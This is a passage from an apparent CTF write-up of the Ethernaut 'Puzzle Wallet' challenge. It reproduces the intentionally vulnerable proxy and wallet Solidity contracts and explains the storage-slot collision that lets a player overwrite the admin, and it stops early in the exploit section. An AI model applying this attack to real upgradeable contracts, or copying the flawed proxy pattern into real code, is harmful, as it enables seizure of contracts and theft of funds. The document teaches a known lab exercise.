</span></span><span class=line><span class=ln>24</span><span class=cl>    <span class=kd>function</span> <span class=nf>proposeNewAdmin</span><span class=p>(</span><span class=kt>address</span> <span class=n>_newAdmin</span><span class=p>)</span> <span class=k>external</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>25</span><span class=cl>        <span class=n>pendingAdmin</span> <span class=o>=</span> <span class=n>_newAdmin</span><span class=p>;</span>
</span></span><span class=line><span class=ln>26</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>27</span><span class=cl>
</span></span><span class=line><span class=ln>28</span><span class=cl>    <span class=kd>function</span> <span class=nf>approveNewAdmin</span><span class=p>(</span><span class=kt>address</span> <span class=n>_expectedAdmin</span><span class=p>)</span> <span class=k>external</span> <span class=n>onlyAdmin</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>29</span><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=n>pendingAdmin</span> <span class=o>==</span> <span class=n>_expectedAdmin</span><span class=p>,</span> <span class=s>&#34;Expected new admin by the current admin is not the pending admin&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln>30</span><span class=cl>        <span class=n>admin</span> <span class=o>=</span> <span class=n>pendingAdmin</span><span class=p>;</span>
</span></span><span class=line><span class=ln>31</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>32</span><span class=cl>
</span></span><span class=line><span class=ln>33</span><span class=cl>    <span class=kd>function</span> <span class=nf>upgradeTo</span><span class=p>(</span><span class=kt>address</span> <span class=n>_newImplementation</span><span class=p>)</span> <span class=k>external</span> <span class=n>onlyAdmin</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>34</span><span class=cl>        <span class=n>_upgradeTo</span><span class=p>(</span><span class=n>_newImplementation</span><span class=p>);</span>
</span></span><span class=line><span class=ln>35</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>36</span><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=ln>37</span><span class=cl>
</span></span><span class=line><span class=ln>38</span><span class=cl><span class=kd>contract</span> <span class=nc>PuzzleWallet</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>39</span><span class=cl>    <span class=kt>address</span> <span class=k>public</span> <span class=n>owner</span><span class=p>;</span>
</span></span><span class=line><span class=ln>40</span><span class=cl>    <span class=kt>uint256</span> <span class=k>public</span> <span class=n>maxBalance</span><span class=p>;</span>
</span></span><span class=line><span class=ln>41</span><span class=cl>    <span class=kd>mapping</span><span class=p>(</span><span class=kt>address</span> <span class=o>=&gt;</span> <span class=kt>bool</span><span class=p>)</span> <span class=k>public</span> <span class=n>whitelisted</span><span class=p>;</span>
</span></span><span class=line><span class=ln>42</span><span class=cl>    <span class=kd>mapping</span><span class=p>(</span><span class=kt>address</span> <span class=o>=&gt;</span> <span class=kt>uint256</span><span class=p>)</span> <span class=k>public</span> <span class=n>balances</span><span class=p>;</span>
</span></span><span class=line><span class=ln>43</span><span class=cl>
</span></span><span class=line><span class=ln>44</span><span class=cl>    <span class=kd>function</span> <span class=nf>init</span><span class=p>(</span><span class=kt>uint256</span> <span class=n>_maxBalance</span><span class=p>)</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>45</span><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=n>maxBalance</span> <span class=o>==</span> <span class=mi>0</span><span class=p>,</span> <span class=s>&#34;Already initialized&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln>46</span><span class=cl>        <span class=n>maxBalance</span> <span class=o>=</span> <span class=n>_maxBalance</span><span class=p>;</span>
</span></span><span class=line><span class=ln>47</span><span class=cl>        <span class=n>owner</span> <span class=o>=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>;</span>
</span></span><span class=line><span class=ln>48</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>49</span><span class=cl>
</span></span><span class=line><span class=ln>50</span><span class=cl>    <span class=kd>modifier</span> <span class=nf>onlyWhitelisted</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>51</span><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=n>whitelisted</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>],</span> <span class=s>&#34;Not whitelisted&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln>52</span><span class=cl>        <span class=k>_</span><span class=p>;</span>
</span></span><span class=line><span class=ln>53</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>54</span><span class=cl>
</span></span><span class=line><span class=ln>55</span><span class=cl>    <span class=kd>function</span> <span class=nf>setMaxBalance</span><span class=p>(</span><span class=kt>uint256</span> <span class=n>_maxBalance</span><span class=p>)</span> <span class=k>external</span> <span class=n>onlyWhitelisted</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>56</span><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>).</span><span class=nb>balance</span> <span class=o>==</span> <span class=mi>0</span><span class=p>,</span> <span class=s>&#34;Contract balance is not 0&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln>57</span><span class=cl>        <span class=n>maxBalance</span> <span class=o>=</span> <span class=n>_maxBalance</span><span class=p>;</span>
</span></span><span class=line><span class=ln>58</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>59</span><span class=cl>
</span></span><span class=line><span class=ln>60</span><span class=cl>    <span class=kd>function</span> <span class=nf>addToWhitelist</span><span class=p>(</span><span class=kt>address</span> <span class=n>addr</span><span class=p>)</span> <span class=k>external</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>61</span><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span> <span class=o>==</span> <span class=n>owner</span><span class=p>,</span> <span class=s>&#34;Not the owner&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln>62</span><span class=cl>        <span class=n>whitelisted</span><span class=p>[</span><span class=n>addr</span><span class=p>]</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=ln>63</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>64</span><span class=cl>
</span></span><span class=line><span class=ln>65</span><span class=cl>    <span class=kd>function</span> <span class=nf>deposit</span><span class=p>()</span> <span class=k>external</span> <span class=k>payable</span> <span class=n>onlyWhitelisted</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>66</span><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>).</span><span class=nb>balance</span> <span class=o>&lt;=</span> <span class=n>maxBalance</span><span class=p>,</span> <span class=s>&#34;Max balance reached&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln>67</span><span class=cl>        <span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>+=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>value</span><span class=p>;</span>
</span></span><span class=line><span class=ln>68</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>69</span><span class=cl>
</span></span><span class=line><span class=ln>70</span><span class=cl>    <span class=kd>function</span> <span class=nf>execute</span><span class=p>(</span><span class=kt>address</span> <span class=n>to</span><span class=p>,</span> <span class=kt>uint256</span> <span class=nb>value</span><span class=p>,</span> <span class=kt>bytes</span> <span class=n>calldata</span> <span class=nb>data</span><span class=p>)</span> <span class=k>external</span> <span class=k>payable</span> <span class=n>onlyWhitelisted</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>71</span><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>&gt;=</span> <span class=nb>value</span><span class=p>,</span> <span class=s>&#34;Insufficient balance&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln>72</span><span class=cl>        <span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>-=</span> <span class=nb>value</span><span class=p>;</span>
</span></span><span class=line><span class=ln>73</span><span class=cl>        <span class=p>(</span><span class=kt>bool</span> <span class=n>success</span><span class=p>,)</span> <span class=o>=</span> <span class=n>to</span><span class=p>.</span><span class=nb>call</span><span class=p>{</span><span class=nb>value</span><span class=o>:</span> <span class=nb>value</span><span class=p>}(</span><span class=nb>data</span><span class=p>);</span>
</span></span><span class=line><span class=ln>74</span><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=n>success</span><span class=p>,</span> <span class=s>&#34;Execution failed&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln>75</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>76</span><span class=cl>
</span></span><span class=line><span class=ln>77</span><span class=cl>    <span class=kd>function</span> <span class=nf>multicall</span><span class=p>(</span><span class=kt>bytes</span><span class=p>[]</span> <span class=n>calldata</span> <span class=nb>data</span><span class=p>)</span> <span class=k>external</span> <span class=k>payable</span> <span class=n>onlyWhitelisted</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>78</span><span class=cl>        <span class=kt>bool</span> <span class=n>depositCalled</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=ln>79</span><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=kt>uint256</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=nb>data</span><span class=p>.</span><span class=n>length</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>80</span><span class=cl>            <span class=kt>bytes</span> <span class=k>memory</span> <span class=n>_data</span> <span class=o>=</span> <span class=nb>data</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=ln>81</span><span class=cl>            <span class=kt>bytes4</span> <span class=nb>selector</span><span class=p>;</span>
</span></span><span class=line><span class=ln>82</span><span class=cl>            <span class=k>assembly</span> {
</span></span><span class=line><span class=ln>83</span><span class=cl>                <span class=n>selector</span> <span class=o>:=</span> <span class=nf>mload</span><span class=p>(</span><span class=nf>add</span><span class=p>(</span><span class=n>_data</span><span class=p>,</span> <span class=mi>32</span><span class=p>))</span>
</span></span><span class=line><span class=ln>84</span><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=ln>85</span><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nb>selector</span> <span class=o>==</span> <span class=nb>this</span><span class=p>.</span><span class=n>deposit</span><span class=p>.</span><span class=nb>selector</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>86</span><span class=cl>                <span class=nb>require</span><span class=p>(</span><span class=o>!</span><span class=n>depositCalled</span><span class=p>,</span> <span class=s>&#34;Deposit can only be called once&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln>87</span><span class=cl>                <span class=c1>// Protect against reusing msg.value
</span></span></span><span class=line><span class=ln>88</span><span class=cl><span class=c1></span>                <span class=n>depositCalled</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=ln>89</span><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=ln>90</span><span class=cl>            <span class=p>(</span><span class=kt>bool</span> <span class=n>success</span><span class=p>,)</span> <span class=o>=</span> <span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>).</span><span class=nb>delegatecall</span><span class=p>(</span><span class=nb>data</span><span class=p>[</span><span class=n>i</span><span class=p>]);</span>
</span></span><span class=line><span class=ln>91</span><span class=cl>            <span class=nb>require</span><span class=p>(</span><span class=n>success</span><span class=p>,</span> <span class=s>&#34;Error while delegating call&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln>92</span><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=ln>93</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>94</span><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>In the challenge, they have given us two contracts: <code>PuzzleProxy</code> and <code>PuzzleWallet</code>. <code>PuzzleProxy</code> inherits the <code>UpgradeableProxy</code> contract. Here, they have implemented upgradable logic for the <code>PuzzleProxy</code> contract. <code>PuzzleProxy</code> contract is similar to our <code>State_contract</code>, and <code>PuzzleWallet</code> contract is similar to our <code>Logic_contract</code>. The function logics are written in the <code>PuzzleWallet</code> contract, and state changes are done in the <code>PuzzleProxy</code> contract.</p><p>If you have skipped the concepts part, you might not know what <code>State_contract</code> and <code>Logic_contract</code> are.</p><p>Click <a href=https://github.com/pancakeswap/pancake-swap-lib/blob/master/contracts/proxy/UpgradeableProxy.sol target=_blank rel="noopener noreferrer">here<i class="fas fa-external-link-square-alt ms-1"></i></a> to view the <code>UpgradeableProxy</code> contract.</p><p>The <code>UpgradeableProxy</code> contract constructor takes two arguments: the logic contract address and the init data as input. The constructor in <code>UpgradeableProxy</code> makes a <code>delegate call</code> to the logic contract with the init data passed to the constructor. I will briefly explain <code>UpgradeableProxy</code> in the concepts part.</p><p>The main difference between the example I have explained and the <code>PuzzleProxy</code> contract is the implementation of the logic contract in the state contract.</p><p>In our example, we have written functions in our <code>State_contract</code>, and those functions will make a delegate call to the <code>Logic_contract</code>. But here, since they are using the <code>UpgradeableProxy</code> contract, it will make a delegate call in a different way. When someone calls the <code>PuzzleProxy</code> contract with some data that doesn&rsquo;t match any function selector in the <code>PuzzleProxy</code> contract, then if there is a fallback() function in the <code>PuzzleProxy</code> contract, the call made will reach the fallback() function, and the logic in the fallback() function will execute. <code>PuzzleProxy</code> will make a delegate call to <code>PuzzleWallet</code> when the fallback() function is hit.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=ln> 1</span><span class=cl>
</span></span><span class=line><span class=ln> 2</span><span class=cl> <span class=kd>function</span> <span class=nf>_delegate</span><span class=p>(</span><span class=kt>address</span> <span class=n>implementation</span><span class=p>)</span> <span class=k>internal</span> <span class=p>{</span>
</span></span><span class=line><span class=ln> 3</span><span class=cl>    <span class=c1>// solhint-disable-next-line no-inline-assembly
</span></span></span><span class=line><span class=ln> 4</span><span class=cl><span class=c1></span>    <span class=k>assembly</span> {
</span></span><span class=line><span class=ln> 5</span><span class=cl>        <span class=c1>// Copy msg.data. We take full control of memory in this inline assembly
</span></span></span><span class=line><span class=ln> 6</span><span class=cl><span class=c1></span>        <span class=c1>// block because it will not return to Solidity code. We overwrite the
</span></span></span><span class=line><span class=ln> 7</span><span class=cl><span class=c1></span>        <span class=c1>// Solidity scratch pad at memory position 0.
</span></span></span><span class=line><span class=ln> 8</span><span class=cl><span class=c1></span>        <span class=nf>calldatacopy</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=nf>calldatasize</span><span class=p>())</span>
</span></span><span class=line><span class=ln> 9</span><span class=cl>
</span></span><span class=line><span class=ln>10</span><span class=cl>        <span class=c1>// Call the implementation.
</span></span></span><span class=line><span class=ln>11</span><span class=cl><span class=c1></span>        <span class=c1>// out and outsize are 0 because we don&#39;t know the size yet.
</span></span></span><span class=line><span class=ln>12</span><span class=cl><span class=c1></span>        <span class=ow>let</span> <span class=nv>result</span> <span class=o>:=</span> <span class=nf>delegatecall</span><span class=p>(</span><span class=nf>gas</span><span class=p>(),</span> <span class=n>implementation</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=nf>calldatasize</span><span class=p>(),</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=ln>13</span><span class=cl>
</span></span><span class=line><span class=ln>14</span><span class=cl>        <span class=c1>// Copy the returned data.
</span></span></span><span class=line><span class=ln>15</span><span class=cl><span class=c1></span>        <span class=nf>returndatacopy</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=nf>returndatasize</span><span class=p>())</span>
</span></span><span class=line><span class=ln>16</span><span class=cl>
</span></span><span class=line><span class=ln>17</span><span class=cl>        <span class=nf>switch</span> <span class=n>result</span>
</span></span><span class=line><span class=ln>18</span><span class=cl>        <span class=c1>// delegatecall returns 0 on error.
</span></span></span><span class=line><span class=ln>19</span><span class=cl><span class=c1></span>        <span class=n>case</span> <span class=mi>0</span> <span class=p>{</span> <span class=nf>revert</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nf>returndatasize</span><span class=p>())</span> <span class=p>}</span>
</span></span><span class=line><span class=ln>20</span><span class=cl>        <span class=n>default</span> <span class=p>{</span> <span class=nf>return</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nf>returndatasize</span><span class=p>())</span> <span class=p>}</span>
</span></span><span class=line><span class=ln>21</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>22</span><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=ln>23</span><span class=cl>
</span></span><span class=line><span class=ln>24</span><span class=cl>
</span></span><span class=line><span class=ln>25</span><span class=cl><span class=kd>function</span> <span class=nf>_fallback</span><span class=p>()</span> <span class=k>internal</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>26</span><span class=cl>    <span class=n>_beforeFallback</span><span class=p>();</span>
</span></span><span class=line><span class=ln>27</span><span class=cl>    <span class=n>_delegate</span><span class=p>(</span><span class=n>_implementation</span><span class=p>());</span>
</span></span><span class=line><span class=ln>28</span><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The above code is from <code>proxy</code> contract which is inherited by <code>UpgradeableProxy</code> contract. If the above code doesn&rsquo;t make sense don&rsquo;t think much of it. Basically it will copy the calldata and makes delegate call to implemntation(PuzzleWallet) contract.</p><p>Now i will explain in detail of <code>PuzzleProxy</code> and <code>PuzzleWallet</code> contracts.</p><p>The <code>PuzzleProxy</code> contract has two state variables named <code>pendingAdmin</code> and <code>admin</code> of type address.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=ln>1</span><span class=cl><span class=kd>constructor</span><span class=p>(</span><span class=kt>address</span> <span class=n>_admin</span><span class=p>,</span> <span class=kt>address</span> <span class=n>_implementation</span><span class=p>,</span> <span class=kt>bytes</span> <span class=k>memory</span> <span class=n>_initData</span><span class=p>)</span>
</span></span><span class=line><span class=ln>2</span><span class=cl>        <span class=n>UpgradeableProxy</span><span class=p>(</span><span class=n>_implementation</span><span class=p>,</span> <span class=n>_initData</span><span class=p>)</span>
</span></span><span class=line><span class=ln>3</span><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=ln>4</span><span class=cl>        <span class=n>admin</span> <span class=o>=</span> <span class=n>_admin</span><span class=p>;</span>
</span></span><span class=line><span class=ln>5</span><span class=cl>    <span class=p>}</span>
</span></span></code></pre></div><p>The constructor of <code>PuzzleProxy</code> takes three arguments: <code>_admin</code> (address), <code>_implementation</code> (address), and <code>_initData</code> (bytes memory). It calls the constructor of <code>UpgradeableProxy</code> by passing the implementation address and init data as input. Then it sets the admin to <code>_admin</code> passed during the call.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=ln>1</span><span class=cl><span class=kd>modifier</span> <span class=nf>onlyAdmin</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>2</span><span class=cl>    <span class=nb>require</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span> <span class=o>==</span> <span class=n>admin</span><span class=p>,</span> <span class=s>&#34;Caller is not the admin&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln>3</span><span class=cl>    <span class=k>_</span><span class=p>;</span>
</span></span><span class=line><span class=ln>4</span><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The modifier <code>onlyAdmin()</code> checks whether the <code>msg.sender</code> (caller) is the admin or not.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=ln>1</span><span class=cl><span class=kd>function</span> <span class=nf>proposeNewAdmin</span><span class=p>(</span><span class=kt>address</span> <span class=n>_newAdmin</span><span class=p>)</span> <span class=k>external</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>2</span><span class=cl>    <span class=n>pendingAdmin</span> <span class=o>=</span> <span class=n>_newAdmin</span><span class=p>;</span>
</span></span><span class=line><span class=ln>3</span><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The function <code>proposeNewAdmin()</code> takes an argument of type <code>address</code> (<code>_newAdmin</code>) as input and sets the <code>pendingAdmin</code> to <code>_newAdmin</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=ln>1</span><span class=cl><span class=kd>function</span> <span class=nf>approveNewAdmin</span><span class=p>(</span><span class=kt>address</span> <span class=n>_expectedAdmin</span><span class=p>)</span> <span class=k>external</span> <span class=n>onlyAdmin</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>2</span><span class=cl>    <span class=nb>require</span><span class=p>(</span><span class=n>pendingAdmin</span> <span class=o>==</span> <span class=n>_expectedAdmin</span><span class=p>,</span> <span class=s>&#34;Expected new admin by the current admin is not the pending admin&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln>3</span><span class=cl>    <span class=n>admin</span> <span class=o>=</span> <span class=n>pendingAdmin</span><span class=p>;</span>
</span></span><span class=line><span class=ln>4</span><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The function <code>approveNewAdmin()</code> takes an argument of type <code>address</code> (<code>_expectedAdmin</code>) as input. It checks whether the <code>_expectedAdmin</code> and <code>pendingAdmin</code> are the same or not. If they match, then <code>admin</code> will be set to <code>pendingAdmin</code>. If they don&rsquo;t match, the function will revert. This function has a modifier <code>onlyAdmin</code>, which means the function can only be called by the admin. If someone else tries to call this function, it will revert.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=ln>1</span><span class=cl><span class=kd>function</span> <span class=nf>upgradeTo</span><span class=p>(</span><span class=kt>address</span> <span class=n>_newImplementation</span><span class=p>)</span> <span class=k>external</span> <span class=n>onlyAdmin</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>2</span><span class=cl>    <span class=n>_upgradeTo</span><span class=p>(</span><span class=n>_newImplementation</span><span class=p>);</span>
</span></span><span class=line><span class=ln>3</span><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The function <code>upgradeTo()</code> takes an argument of type <code>address</code> as input and executes the modifier <code>onlyAdmin</code>. If the modifier is passed, it will upgrade the implementation contract.</p><p>Now, I will explain only one important function of the <code>PuzzleWallet</code> contract. The other functions are understandable.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=ln> 1</span><span class=cl>
</span></span><span class=line><span class=ln> 2</span><span class=cl><span class=kd>function</span> <span class=nf>multicall</span><span class=p>(</span><span class=kt>bytes</span><span class=p>[]</span> <span class=n>calldata</span> <span class=nb>data</span><span class=p>)</span> <span class=k>external</span> <span class=k>payable</span> <span class=n>onlyWhitelisted</span> <span class=p>{</span>
</span></span><span class=line><span class=ln> 3</span><span class=cl>    <span class=kt>bool</span> <span class=n>depositCalled</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 4</span><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kt>uint256</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=nb>data</span><span class=p>.</span><span class=n>length</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=ln> 5</span><span class=cl>        <span class=kt>bytes</span> <span class=k>memory</span> <span class=n>_data</span> <span class=o>=</span> <span class=nb>data</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=ln> 6</span><span class=cl>        <span class=kt>bytes4</span> <span class=nb>selector</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 7</span><span class=cl>        <span class=k>assembly</span> {
</span></span><span class=line><span class=ln> 8</span><span class=cl>            <span class=n>selector</span> <span class=o>:=</span> <span class=nf>mload</span><span class=p>(</span><span class=nf>add</span><span class=p>(</span><span class=n>_data</span><span class=p>,</span> <span class=mi>32</span><span class=p>))</span>
</span></span><span class=line><span class=ln> 9</span><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=ln>10</span><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nb>selector</span> <span class=o>==</span> <span class=nb>this</span><span class=p>.</span><span class=n>deposit</span><span class=p>.</span><span class=nb>selector</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>11</span><span class=cl>            <span class=nb>require</span><span class=p>(</span><span class=o>!</span><span class=n>depositCalled</span><span class=p>,</span> <span class=s>&#34;Deposit can only be called once&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln>12</span><span class=cl>            <span class=c1>// Protect against reusing msg.value
</span></span></span><span class=line><span class=ln>13</span><span class=cl><span class=c1></span>            <span class=n>depositCalled</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=ln>14</span><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=ln>15</span><span class=cl>        <span class=p>(</span><span class=kt>bool</span> <span class=n>success</span><span class=p>,)</span> <span class=o>=</span> <span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>).</span><span class=nb>delegatecall</span><span class=p>(</span><span class=nb>data</span><span class=p>[</span><span class=n>i</span><span class=p>]);</span>
</span></span><span class=line><span class=ln>16</span><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=n>success</span><span class=p>,</span> <span class=s>&#34;Error while delegating call&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln>17</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>18</span><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The function <code>multicall()</code> takes a bytes array as input and executes the modifier <code>onlyWhitelisted</code>. If the modifier is passed, for each data in the array, the function will make a delegate call to the same contract with the data as each element of the array.</p><h3 id=exploit data-numberify>Exploit<a class="anchor ms-1" href=#exploit></a></h3><p>Our task is to become admin of the PuzzleProxy contract. If we open the instance address in block explorer we can find that the instance is having 0.001 amount of ether. Now let&rsquo;s start exploiting the contract.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=ln>1</span><span class=cl><span class=o>&gt;</span> <span class=nx>contract</span><span class=p>.</span><span class=nx>abi</span>
</span></span></code></pre></div><p>If we enter the <code>contract.abi</code> we can find all the functions of PuzzleWallet contract. Now we may think that the given instance is an instance of PuzzleWallet contract. But it is not. They have given us the instance of PuzzleProxy contract and they just spoofed the abi of PuzzleWallet contract.</p><p>So all the state variables reading and writing will be done in <code>PuzzleProxy</code> contract and logic execution part will be done on <code>PuzzleWallet</code> contract.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=ln>1</span><span class=cl>
</span></span><span class=line><span class=ln>2</span><span class=cl><span class=kd>function</span> <span class=nf>proposeNewAdmin</span><span class=p>(</span><span class=kt>address</span> <span class=n>_newAdmin</span><span class=p>)</span> <span class=k>external</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>3</span><span class=cl>    <span class=n>pendingAdmin</span> <span class=o>=</span> <span class=n>_newAdmin</span><span class=p>;</span>
</span></span><span class=line><span class=ln>4</span><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=ln>5</span><span class=cl>
</span></span><span class=line><span class=ln>6</span><span class=cl><span class=kd>function</span> <span class=nf>approveNewAdmin</span><span class=p>(</span><span class=kt>address</span> <span class=n>_expectedAdmin</span><span class=p>)</span> <span class=k>external</span> <span class=n>onlyAdmin</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>7</span><span class=cl>    <span class=nb>require</span><span class=p>(</span><span class=n>pendingAdmin</span> <span class=o>==</span> <span class=n>_expectedAdmin</span><span class=p>,</span> <span class=s>&#34;Expected new admin by the current admin is not the pending admin&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln>8</span><span class=cl>    <span class=n>admin</span> <span class=o>=</span> <span class=n>pendingAdmin</span><span class=p>;</span>
</span></span><span class=line><span class=ln>9</span><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Our task is become admin of the <code>PuzzleProxy</code> contract but if we see the <code>PuzzleProxy</code> contract anyone can propose the new admin but it will be only aprooved by the present admin. Since we are not the admin of the <code>PuzzleProxy</code> contract we won&rsquo;t be able to change the admin. So we need to think any different approach.</p><p>If we check the storage layout of <code>PuzzleProxy</code> and <code>PuzzleWallet</code>, we can see that both layouts are not the same. They are completely different. Even though they are different, the <code>PuzzleWallet</code> must have all the state variables of the <code>PuzzleProxy</code> contract, but both layouts are different. Since the <code>PuzzleProxy</code> contract makes a delegate call to the <code>PuzzleWallet</code> contract, we can exploit this discrepancy.</p><p>If we somehow change the <code>maxBalance</code> in <code>PuzzleWallet</code> during the delegate call, it will change the address of the admin in the <code>PuzzleProxy</code> contract.</p><p>During the delegate call in the sense, when we make a call to the <code>PuzzleProxy</code> contract with some data that matches the function selector of the <code>PuzzleWallet</code> contract, the <code>PuzzleProxy</code> will make a delegate call to the function that matches the function selector.</p><p>Our target is to change <code>maxBalance</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=ln> 1</span><span class=cl>
